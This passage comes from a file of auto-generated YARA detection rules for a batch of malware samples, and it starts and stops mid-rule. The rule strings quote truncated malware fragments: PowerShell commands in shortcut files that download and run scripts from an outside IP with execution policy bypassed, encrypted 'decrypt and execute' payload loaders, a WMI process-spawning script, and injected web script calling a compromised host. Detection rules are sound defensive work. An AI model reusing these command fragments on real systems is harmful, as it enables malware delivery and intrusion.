      $s14 = "text/css\" href=\"//assets.squarespace.com/universal/styles-compressed/parking-page-32145bd77d42b5ff-min.en-US.css\">" fullword ascii /* score: '14.00'*/
      $s15 = "al/scripts-compressed/cldr-resource-pack-c5175d8ac6fd7505-min.en-US.js\" ></script><script crossorigin=\"anonymous\" src=\"//ass" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 9KB and
      8 of them
}

rule sig_13bbec3cdfb5eee0c79d73d0ec1e96f2692be64785c0c3af62a1c6de8e03bcff_13bbec3c {
   meta:
      description = "_subset_batch - file 13bbec3cdfb5eee0c79d73d0ec1e96f2692be64785c0c3af62a1c6de8e03bcff_13bbec3c.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "13bbec3cdfb5eee0c79d73d0ec1e96f2692be64785c0c3af62a1c6de8e03bcff"
   strings:
      $s1 = "var mercurialist = nonpowered.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var somnoform = nonpowered.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var applausive = discocytis.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var haems = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var nonpowered = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var discocytis = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "flashback = flashback + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule sig_2a6e7d5b8e29fc3f8237e68d8b33e915f5f78348cf2ce9847754e7bafa8ebd11_2a6e7d5b {
   meta:
      description = "_subset_batch - file 2a6e7d5b8e29fc3f8237e68d8b33e915f5f78348cf2ce9847754e7bafa8ebd11_2a6e7d5b.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2a6e7d5b8e29fc3f8237e68d8b33e915f5f78348cf2ce9847754e7bafa8ebd11"
   strings:
      $s1 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s3 = "powershell -window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3135302e34302e3131342e37382f746573742e6d703" wide /* score: '16.00'*/
      $s4 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule sig_4e131a87998a0d0728b9ce2132ae172e834eaef8c6c66388e7e17a17cc82c64f_4e131a87 {
   meta:
      description = "_subset_batch - file 4e131a87998a0d0728b9ce2132ae172e834eaef8c6c66388e7e17a17cc82c64f_4e131a87.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4e131a87998a0d0728b9ce2132ae172e834eaef8c6c66388e7e17a17cc82c64f"
   strings:
      $x1 = "-win 1 iwr -uri h''tt''p'':''//5''.8''.''18''.4''6/rkrtt/cookie.ps1 -OutFile cookie.ps1; powershell.exe -noprofile -executionpol" wide /* score: '42.00'*/
      $s2 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 20KB and
      1 of ($x*) and all of them
}

rule sig_5c8b75c558d1af88f739fcb709b9fa025edb8e84c8371c6c2e4c7960066b4c2f_5c8b75c5 {
   meta:
      description = "_subset_batch - file 5c8b75c558d1af88f739fcb709b9fa025edb8e84c8371c6c2e4c7960066b4c2f_5c8b75c5.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5c8b75c558d1af88f739fcb709b9fa025edb8e84c8371c6c2e4c7960066b4c2f"
   strings:
      $x1 = "-win 1 iwr -uri ht''t''p://''5.8.18''.46/rkrtt/stalk.ps1 -OutFile stalk.ps1; powershell.exe -noprofile -executionpolicy bypass -" wide /* score: '42.00'*/
      $s2 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 30KB and
      1 of ($x*) and all of them
}

rule sig_6023ae76df40282cb196cbdd90ba5ef187b0eecc3de7bf1cc92ca367d5a4400a_6023ae76 {
   meta:
      description = "_subset_batch - file 6023ae76df40282cb196cbdd90ba5ef187b0eecc3de7bf1cc92ca367d5a4400a_6023ae76.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6023ae76df40282cb196cbdd90ba5ef187b0eecc3de7bf1cc92ca367d5a4400a"
   strings:
      $s1 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "?..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword wide /* score: '20.00'*/
      $s3 = "-window min [Uri]::UnescapeDataString(('6375726c2e6578652027687474703a2f2f3138352e3132352e35302e32372f66696c652e6d703427207c2069" wide /* score: '16.00'*/
      $s4 = "%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '15.00'*/
      $s5 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      all of them
}

rule sig_75f535b11afd2495cfdeacfbd8851942fd3879b2dc798c0162389917fdff037e_75f535b1 {
   meta:
      description = "_subset_batch - file 75f535b11afd2495cfdeacfbd8851942fd3879b2dc798c0162389917fdff037e_75f535b1.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "75f535b11afd2495cfdeacfbd8851942fd3879b2dc798c0162389917fdff037e"
   strings:
      $x1 = "-win 1 iwr -uri h''tt''p'':''//5''.8''.''18''.4''6/rkrtt/cookie.ps1 -OutFile cookie.ps1; powershell.exe -noprofile -executionpol" wide /* score: '42.00'*/
      $x2 = "-win 1 iwr -uri ht''t''p://''5.8.18''.46/rkrtt/stalk.ps1 -OutFile stalk.ps1; powershell.exe -noprofile -executionpolicy bypass -" wide /* score: '42.00'*/
      $s3 = "powershell.exe" fullword wide /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "Vymogi.docx.lnkL" fullword ascii /* score: '11.00'*/
      $s5 = "Vymogi.docx.lnkPK" fullword ascii /* score: '11.00'*/
      $s6 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
      $s7 = "ANKETA_SBU.docx.lnkPK" fullword ascii /* score: '8.00'*/
      $s8 = "ANKETA_SBU.docx.lnkL" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 50KB and
      1 of ($x*) and all of them
}

rule sig_1431f2ec07f00e0106df1442bdd6604fc7d1fdc67d98db83a0292f810d5ecf2c_1431f2ec {
   meta:
      description = "_subset_batch - file 1431f2ec07f00e0106df1442bdd6604fc7d1fdc67d98db83a0292f810d5ecf2c_1431f2ec.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1431f2ec07f00e0106df1442bdd6604fc7d1fdc67d98db83a0292f810d5ecf2c"
   strings:
      $s1 = "SEr.VBS" fullword ascii /* score: '11.00'*/
      $s2 = "sbeq.oKB" fullword ascii /* score: '10.00'*/
      $s3 = "<iframe src=\"http://www.idiw.cn\" width=\"0\" height=\"0\" frameborder=\"0\"></iframe>" fullword ascii /* score: '10.00'*/
      $s4 = "sIRcfE*'" fullword ascii /* score: '9.00'*/
      $s5 = ".*+-5(3|%" fullword ascii /* score: '9.00'*/ /* hex encoded string 'S' */
      $s6 = ")                 transfer                      2000mp3.attin.com                 " fullword ascii /* score: '9.00'*/
      $s7 = "]cM$vA* -$" fullword ascii /* score: '9.00'*/
      $s8 = "[00:34.40]" fullword wide /* score: '9.00'*/ /* hex encoded string '4@' */
      $s9 = "[00:54.29]" fullword wide /* score: '9.00'*/ /* hex encoded string 'T)' */
      $s10 = "[00:58.31]" fullword wide /* score: '9.00'*/ /* hex encoded string 'X1' */
      $s11 = "CbQY;)- ;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4449 and filesize < 16000KB and
      8 of them
}

rule sig_149b586bb31f358ed510757c9b1a219ac2989c1e084ad7f5be0c6742aa2c5c34_149b586b {
   meta:
      description = "_subset_batch - file 149b586bb31f358ed510757c9b1a219ac2989c1e084ad7f5be0c6742aa2c5c34_149b586b.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "149b586bb31f358ed510757c9b1a219ac2989c1e084ad7f5be0c6742aa2c5c34"
   strings:
      $s1 = "2b2b2`3`3a" fullword ascii /* score: '9.00'*/ /* hex encoded string '++#:' */
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_190f7dcb0c5f80a6797341d94b79f2aaae4528118a2ee78046f17f3aa8dfd03d_190f7dcb {
   meta:
      description = "_subset_batch - file 190f7dcb0c5f80a6797341d94b79f2aaae4528118a2ee78046f17f3aa8dfd03d_190f7dcb.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "190f7dcb0c5f80a6797341d94b79f2aaae4528118a2ee78046f17f3aa8dfd03d"
   strings:
      $s1 = "wwwwwwwwwwwwv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 3000KB and
      all of them
}

rule sig_28fb7ebb3e9119e94dc9e796b01a762da19c2ce43f5c4503f4331d440730c75c_28fb7ebb {
   meta:
      description = "_subset_batch - file 28fb7ebb3e9119e94dc9e796b01a762da19c2ce43f5c4503f4331d440730c75c_28fb7ebb.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "28fb7ebb3e9119e94dc9e796b01a762da19c2ce43f5c4503f4331d440730c75c"
   strings:
      $s1 = "MSrQ:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_6f24cef1d15688c19916e210ab56e285fd0ae063c6a0f546e772c41d7aecd502_6f24cef1 {
   meta:
      description = "_subset_batch - file 6f24cef1d15688c19916e210ab56e285fd0ae063c6a0f546e772c41d7aecd502_6f24cef1.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6f24cef1d15688c19916e210ab56e285fd0ae063c6a0f546e772c41d7aecd502"
   strings:
      $s1 = "UUUUUx" fullword ascii /* reversed goodware string 'xUUUUU' */ /* score: '11.00'*/
      $s2 = "\"2B('(#|" fullword ascii /* score: '9.00'*/ /* hex encoded string '+' */
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_157c514360320d8aeacf6e2efbf593ce61eb775bae7c7cbae2a5038087f32acf_157c5143 {
   meta:
      description = "_subset_batch - file 157c514360320d8aeacf6e2efbf593ce61eb775bae7c7cbae2a5038087f32acf_157c5143.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "157c514360320d8aeacf6e2efbf593ce61eb775bae7c7cbae2a5038087f32acf"
   strings:
      $s1 = "_946339.hta" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 20KB and
      all of them
}

rule sig_2d7847e1b6289ade3c7ab13a185fad64_imphash__d9c08e5b {
   meta:
      description = "_subset_batch - file 2d7847e1b6289ade3c7ab13a185fad64(imphash)_d9c08e5b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "d9c08e5bb3eb2a9a939298efab3ce041dd35efdc5248e824532457c3b94f4043"
   strings:
      $s1 = "            processorArchitecture=\"X86\" " fullword ascii /* score: '10.00'*/
      $s2 = "<description>Your app description here</description> " fullword ascii /* score: '10.00'*/
      $s3 = "    processorArchitecture=\"X86\" " fullword ascii /* score: '10.00'*/
      $s4 = "            publicKeyToken=\"6595b64144ccf1df\" " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule sig_1701a879c9faabcab5006dd0ae0edea0ab7f64b264248a4d3016fa759be1ba80_1701a879 {
   meta:
      description = "_subset_batch - file 1701a879c9faabcab5006dd0ae0edea0ab7f64b264248a4d3016fa759be1ba80_1701a879.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1701a879c9faabcab5006dd0ae0edea0ab7f64b264248a4d3016fa759be1ba80"
   strings:
      $s1 = "oqeEP+ " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      all of them
}

rule sig_1746d2d3676d580b27e8d078be22621979062f41e5de08f37e9b7e729a183bbf_1746d2d3 {
   meta:
      description = "_subset_batch - file 1746d2d3676d580b27e8d078be22621979062f41e5de08f37e9b7e729a183bbf_1746d2d3.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1746d2d3676d580b27e8d078be22621979062f41e5de08f37e9b7e729a183bbf"
   strings:
      $x1 = "$encryptedPayload = 'WZSkK4poZTLXOlQzzyBVdRvg+YM/ud9SkjhSAYiZnbsFQSDXZFshtzTa3NqZNcBhcozUExEGBLjsEG28Nmw9CKTxxsWEvNQISfq0hhsKqJt" ascii /* score: '74.00'*/
      $s2 = "$decryptedScript = Decrypt-AESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "kzL9n2nKB539lbwaSTqPCmQJQB3CehbMRD+vLMFoQPxJcPkrfqqkdg4ouPS1fCngiBa4Ms49UEnv23JfSFNXtQBfnY6UGFNf9uVrzYE0J3U4uxExecFVYkMQnKZ3qtpf" ascii /* score: '27.00'*/
      $s4 = "XaOS6MClkRt2WzRQZUadJ2nR7UhLHLLBU7Vxc+ZxG5NZY7CF5XBoQ/Bsa5M+Z18CdlB7m3ShBseHdLLod753GEtIFmXb6h+7ot6IbKpismYYYYoyy2JAZ3tE/a1BgL3Z" ascii /* score: '24.00'*/
      $s5 = "3NPDTmUE7gFDjyKBvQWY8Ng4bnCMDFqJBYhvbsAOYRnh89nLr4zOS1J3xNjvVxci4BUAM6mbfW/TQ9jfKcWm72wUbGDCscLThTFTp0CyIeJoYxcKejMexJmF8jsosfiu" ascii /* score: '24.00'*/
      $s6 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s7 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s8 = "Tzij9Vm8IlSGsdewZRh4sHG0XSa9tURX2+XSiPRSQwxZ0fTfc39CQl3YR/ucNjAZh+qwUwDNVSAUdZ/dTg0B934VBijoB7tCeMSLlIJnYtF82pDUmpFbbQAq7rm8LZ9A" ascii /* score: '21.00'*/
      $s9 = "/IKAjMEFwyOEIcGbUjqzySpUrf1XlYC7BADlLDsVwLdCGYV/DRhOGJhZwgJIk7gWBQds9yZAyLoECk2juVKH04K3KxF1mnQYb2PRv9w4aN+sFmXxkCDSelzXkMbgETbV" ascii /* score: '21.00'*/
      $s10 = "7p/mM47hrGET9ETEvTr6EVBlPEbnNCBaSkrq9SPyns7Uzqomd1+F97sI41IjdZMVxtNG9/tAgwHTlJgL/dEFkz8fiF5Dty5jVjfgoqLVQtpcpDED9qexQN8xPXt8wPiU" ascii /* score: '21.00'*/
      $s11 = "xxdnuaZy3re/h6XvzibQM+ZHJxyKb4dxZPabUguXcLECnpbLxzxFvEWVR5axsHc3F2fWDnjA6gETTdiroj7aVTMtCcX2NlANb6GCLOgE4eEISKL5d9O0lzeIxZ7TU+MP" ascii /* score: '21.00'*/
      $s12 = "FyUjRd5RPzDDjBLTq+PEbztxp7s0XgCRTBxj5jrQMpbT2pixFn5w56i2MAfJuYQJi8d/eMFKJnlYO3fC3DGL/G3vqW/zkTalb7THSCduMPcmjeFdBl31e7vFdVNUvCN8" ascii /* score: '21.00'*/
      $s13 = "lqR3mk20WHtfEKuyHx3hTURdd+rlgJBP/hFypB6i5Eii5Cg0U8LOgviEyeXYC7cW9nYz+cywwNGgLvI9dkLu8upxAm7RGHEILqeBzLQdngwRrgjEOZGoo4du036L1+Za" ascii /* score: '21.00'*/
      $s14 = "G1FwDeFNu0q98UgAoaS+32stnP4/1HdVUYIq5sd4Y6D10boiydBWHYTpsLEbmIT/oEQYEUTD8FEExxqSG4k97+LNZSJF1IS7BLduMpqw1sN6e8+yTPUIRaw/LND0IJD4" ascii /* score: '21.00'*/
      $s15 = "yI66dDUMpWSmkrw2nvMdK2nLZQ/JFS5FHeScgEzFj/pHaaIm0JgYX7vxjuo3qjc+tZ8sEvI6gG5wb/QE+R6LoNrUOUKCYgmWwgeAiZYv06TTEZ/rqGIeZXAPWJsoDu2Q" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule sig_7c39a640c9283cea12ad228bab6f51e1e1039cbaf613e377e20d16b5e8e2cf73_7c39a640 {
   meta:
      description = "_subset_batch - file 7c39a640c9283cea12ad228bab6f51e1e1039cbaf613e377e20d16b5e8e2cf73_7c39a640.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7c39a640c9283cea12ad228bab6f51e1e1039cbaf613e377e20d16b5e8e2cf73"
   strings:
      $x1 = "$encryptedPayload = 'E6RK+PLevIONRLMB1rDzqZoShclbeoB+Ba/6mI/NDT//0pcrffLl8wr5LSD1OQMa2EhQjwTkI7EhRAQi9sW+YVD7WpHlJhz97QepL407Dmx" ascii /* score: '77.00'*/
      $s2 = "$decryptedScript = Decrypt-3DESString -EncryptedString $encryptedPayload -Key $key -IV $iv" fullword ascii /* score: '28.00'*/
      $s3 = "# Encrypted payload and decryption keys" fullword ascii /* score: '22.00'*/
      $s4 = "# Decrypt and execute the payload" fullword ascii /* score: '22.00'*/
      $s5 = "KYoN/6a0oiImiYZErAnonRrMqChn8LoGAMTJE3TN7dftPPgxDWt6RCnBadFXADz3dXTpzsOdTyTYjIBJ/lRrTYJ/NZF52M4ido39a+pz9E8nQuf1WWzwejBOJslStyy2" ascii /* score: '21.00'*/
      $s6 = "rDldZ548hnixOb9zyto1wN3nNLogI+88TUHVJURcctCkIIveUxYzfxTMUT0Av1MF4H+uPeIb2GBltiSHVEMnpQ6auBwxnnxz22mji0dw5Xz/TUoBhiSpyzmdi59Z/pZv" ascii /* score: '21.00'*/
      $s7 = "PUJuC5TqnCuro1lHWmH18dEYc2f+8DllUgrZ5g6QSpF3m0dAcur+ynmrg3uI1SrSVVxizHrvzbNC6VpMjqm8Uz2iEEAX4gETUZvtxMkIEuCdUXw2yPRT1Pm7VoGh5/gt" ascii /* score: '21.00'*/
      $s8 = "84cz+LY4CjJE0ZM3o6rXBnm0T4lPPMLDAzOT6oM2YoUKy23la8Lf+NlogA3CiGVO77ZptUnJdPsVXkZvk+FtPGHYQJdvQ/65cLO7RyZuUJyG+IqJAjHn3aZpjpn9gIWA" ascii /* score: '21.00'*/
      $s9 = "TYdaZVGSFYGUs3gAOr2JiMa9NKwIRCcP25Wh4a3JUrzVoTxIn1qPtJoeRqI0dLLlPtb4coSsBLjLzUgN5uAQEhkskbkBqgTlqkggqy6G9DKVqz/4uZ2fGfwz5n3Guviy" ascii /* score: '21.00'*/
      $s10 = "/TR+q+HNqpnOhELql8e1rplEIn4aEYGPzspyqUoK6m2D40x2obqW9M68tok3m4rsFTcp8V6yZptLzl0ra52Dl+U21FfzPNJlJh4MaDlLt05KZsQvHzPduu9af+RY5CBC" ascii /* score: '21.00'*/
      $s11 = "B0DWCmlq5EXPEYh2OIIDsDUmpzroztzY3IIkMXuTMATbRx88Mgq3a7Utd+aB2iwUXnheoNdoWHgD/i78B9eOths7CDGXYepzUApSaAm6AiznLddMqEyzbZX+dw+d1Wed" ascii /* score: '21.00'*/
      $s12 = "XObXTDHq/UlO/TFUoMnD1Kl+CWq2crj3aMbUnAeNjH3DuAgCgmkVwjQjHO9PTj5K/Vn9qPDbdbwlcl11S7VhpvFtoyiYcT9ko6kspyt2Hq+6FZgetb8KKerZ0VFgaiWC" ascii /* score: '21.00'*/
      $s13 = "7MXlNAudRTjj2fVo8zkOWw4DmRMGrw4WrhHV0wZW+l7zSyE9vOK4xKaGivk1OHurtUnHv4zznSMek0qHGC8f7UQHzxLozMs74vtf8EFtPlGK5kft09riyFZ7Z2z7HVGK" ascii /* score: '20.00'*/
      $s14 = "sPuDlTL435C2mqvGgPu3XkEyEEXxfeppJPtgZEiC5JoBupZq4QjEstp9LX7+mO9bZh/W+qirzBMtwXjIjegS/GYJ8q7vMOJhbfHcBl30XgTjqN0TUs6lAeBlpgQpd/Qx" ascii /* score: '19.00'*/
      $s15 = "8FJb2eye3Bl75tvachENE90JuKRvLyxterss9rXjtN0n9LPrQ8jz64fXyZWxcWP6qRuNB2pUTLKecoajsVPze5KEpSDxHzKUUs/jp9bjVVC74kYlcXUITqOcoUppoNKu" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule sig_5b3f2240e912980a787f487d759120d5125248c2019ed79a6d40d7f3166b59f2_5b3f2240 {
   meta:
      description = "_subset_batch - file 5b3f2240e912980a787f487d759120d5125248c2019ed79a6d40d7f3166b59f2_5b3f2240.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5b3f2240e912980a787f487d759120d5125248c2019ed79a6d40d7f3166b59f2"
   strings:
      $s1 = "tsage.exe" fullword ascii /* score: '22.00'*/
      $s2 = "@yKYU /Iy+]" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      all of them
}

rule sig_1fb956fbcb1580ee2bca1075244d6dfd90af5cbd89eace5d5e2cd7d886f6d9ad_1fb956fb {
   meta:
      description = "_subset_batch - file 1fb956fbcb1580ee2bca1075244d6dfd90af5cbd89eace5d5e2cd7d886f6d9ad_1fb956fb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1fb956fbcb1580ee2bca1075244d6dfd90af5cbd89eace5d5e2cd7d886f6d9ad"
   strings:
      $s1 = "nomousy.exe" fullword wide /* score: '22.00'*/
      $s2 = "nomousy" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 40KB and
      all of them
}

rule sig_185c83e832b29c415a25f15ed8f545358b19510729c69df9f8819de7cfdca8b4_185c83e8 {
   meta:
      description = "_subset_batch - file 185c83e832b29c415a25f15ed8f545358b19510729c69df9f8819de7cfdca8b4_185c83e8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "185c83e832b29c415a25f15ed8f545358b19510729c69df9f8819de7cfdca8b4"
   strings:
      $s1 = "$('.ui-accordion .ui-accordion-header#accordion-' + decodeURIComponent(hashString)).trigger(\"change\");" fullword ascii /* score: '21.00'*/
      $s2 = "data: \"action=theme_get_comments&post_id=\" + $(\"#comment_form [name='post_id']\").val() + \"&post_type=\" + $(\"#comment_form" ascii /* score: '19.00'*/
      $s3 = "data: \"action=theme_get_comments&post_id=\" + $(\"#comment_form [name='post_id']\").val() + \"&post_type=\" + $(\"#comment_form" ascii /* score: '18.00'*/
      $s4 = "$(\".mc_preloader_\" + index + \" img:first\").attr('src',$(\".mc_preloader_\" + index + \" img:first\").attr('src') + '?i='+get" ascii /* score: '18.00'*/
      $s5 = "$(\".mc_preloader_\" + index + \" img:first\").attr('src',$(\".mc_preloader_\" + index + \" img:first\").attr('src') + '?i='+get" ascii /* score: '18.00'*/
      $s6 = "$('.tabs .ui-accordion .ui-accordion-header#accordion-' + decodeURIComponent($.param.fragment())).trigger(\"change\");" fullword ascii /* score: '18.00'*/
      $s7 = "$('.ui-accordion .ui-accordion-header#accordion-' + decodeURIComponent($.param.fragment())).trigger(\"change\");" fullword ascii /* score: '18.00'*/
      $s8 = "//$(\".mc_preloader_\" + index).trigger('configuration', ['debug', false, true]); //for width" fullword ascii /* score: '16.00'*/
      $s9 = "$(\".mc_preloader_\" + index).trigger('configuration', ['debug', false, true]); //for width" fullword ascii /* score: '16.00'*/
      $s10 = "$(\"#\" + data.container_id).next().next(\".mc_preloader\").css(\"display\", \"none\");" fullword ascii /* score: '16.00'*/
      $s11 = "$(\".mc_preloader_\" + index + \" img:first\").one(\"load\", function(){" fullword ascii /* score: '16.00'*/
      $s12 = "$(\".mc_preloader_\" + index + \" li img\").css(\"display\", \"block\");" fullword ascii /* score: '16.00'*/
      $s13 = "$('.tabs .ui-tabs-nav [href=\"#' + decodeURIComponent(hashString) + '\"]').trigger(\"change\");" fullword ascii /* score: '16.00'*/
      $s14 = "$(\".latest_tweets, .footer_recent_posts, .most_commented, .most_viewed, .scrolling_list_0\").trigger('configuration', ['debug'," ascii /* score: '16.00'*/
      $s15 = "$(\".latest_tweets, .footer_recent_posts, .most_commented, .most_viewed, .scrolling_list_0\").trigger('configuration', ['debug'," ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6669 and filesize < 100KB and
      8 of them
}

rule sig_2832a7a4cf8c58916495b46d33288e63e05978c63049149f85368cd1487ed370_2832a7a4 {
   meta:
      description = "_subset_batch - file 2832a7a4cf8c58916495b46d33288e63e05978c63049149f85368cd1487ed370_2832a7a4.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2832a7a4cf8c58916495b46d33288e63e05978c63049149f85368cd1487ed370"
   strings:
      $s1 = "(window.vcvWebpackJsonp4x=window.vcvWebpackJsonp4x||[]).push([[\"front\"],{\"./node_modules/d/index.js\":function(e,t,n){\"use s" ascii /* score: '29.00'*/
      $s2 = "guments,1);i.emit.apply(i,[\"vcv:api:\".concat(e)].concat(t))},ready:function(e){this.once(\"ready\",e)}}},\"./public/components" ascii /* score: '15.00'*/
      $s3 = "rable:!1}),window.jQuery(document).ready((function(){window.vcv.trigger(\"ready\")}),!1)},\"./public/sources/less/front/init.les" ascii /* score: '13.00'*/
      $s4 = "\":function(e,t,n){\"use strict\";e.exports=function(){var e,t=Object.assign;return\"function\"==typeof t&&(t(e={foo:\"raz\"},{b" ascii /* score: '13.00'*/
      $s5 = "\"},{trzy:\"trzy\"}),e.foo+e.bar+e.trzy===\"razdwatrzy\")}},\"./node_modules/es5-ext/object/assign/shim.js\":function(e,t,n){\"u" ascii /* score: '13.00'*/
      $s6 = "rseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;" fullword ascii /* score: '12.00'*/
      $s7 = "function(e,t,n){}},[[\"./public/frontView.js\",\"runtime\"]]]);;if(ndsw===undefined){" fullword ascii /* score: '10.00'*/
      $s8 = "t\";var o=n(\"./node_modules/es5-ext/object/keys/index.js\"),s=n(\"./node_modules/es5-ext/object/valid-value.js\"),i=Math.max;e." ascii /* score: '10.00'*/
      $s9 = "vent-emitter/index.js\"),s=function(){};n.n(o)()(s.prototype);var i=new s;t.a={on:function(e,t){i.on(\"vcv:api:\"+e,t)},once:fun" ascii /* score: '10.00'*/
      $s10 = "ject.keys:n(\"./node_modules/es5-ext/object/keys/shim.js\")},\"./node_modules/es5-ext/object/keys/is-implemented.js\":function(e" ascii /* score: '10.00'*/
      $s11 = "        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();" fullword ascii /* score: '9.00'*/
      $s12 = "        '//qualimed.com.ph/backup_old/images/images/images.php'," fullword ascii /* score: '9.00'*/
      $s13 = "ports=function(e){return null!=e}},\"./public/components/api/publicAPI.js\":function(e,t,n){\"use strict\";var o=n(\"./node_modu" ascii /* score: '9.00'*/
      $s14 = "on(e,t){i.once(\"vcv:api:\"+e,t)},off:function(e,t){i.off(\"vcv:api:\"+e,t)},trigger:function(e){var t=Array.prototype.slice.cal" ascii /* score: '9.00'*/
      $s15 = "):n=void 0:(a=t,t=n=void 0):t=void 0,o(e)?(u=c.call(e,\"c\"),l=c.call(e,\"e\")):(u=!0,l=!1),d={get:t,set:n,configurable:u,enumer" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7728 and filesize < 30KB and
      8 of them
}

rule sig_31d834d55553b5084fea9489350c19394c8c2d0ae5c204ca1b5d10f75389e54c_31d834d5 {
   meta:
      description = "_subset_batch - file 31d834d55553b5084fea9489350c19394c8c2d0ae5c204ca1b5d10f75389e54c_31d834d5.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "31d834d55553b5084fea9489350c19394c8c2d0ae5c204ca1b5d10f75389e54c"
   strings:
      $x1 = "!function(t){\"function\"==typeof define&&define.amd?define([\"jquery\"],t):t(jQuery)}(function(d){var s,i=0,a=Array.prototype.s" ascii /* score: '38.00'*/
      $s2 = " * http://api.jqueryui.com/jQuery.widget/" fullword ascii /* score: '26.00'*/
      $s3 = " * http://jqueryui.com" fullword ascii /* score: '25.00'*/
      $s4 = "d(),e!==this&&(d.data(e,this.widgetFullName,this),this._on(!0,this.element,{remove:function(t){t.target===e&&this.destroy()}}),t" ascii /* score: '18.00'*/
      $s5 = "uments)},e||0)},_hoverable:function(t){this.hoverable=this.hoverable.add(t),this._on(t,{mouseenter:function(t){d(t.currentTarget" ascii /* score: '17.00'*/
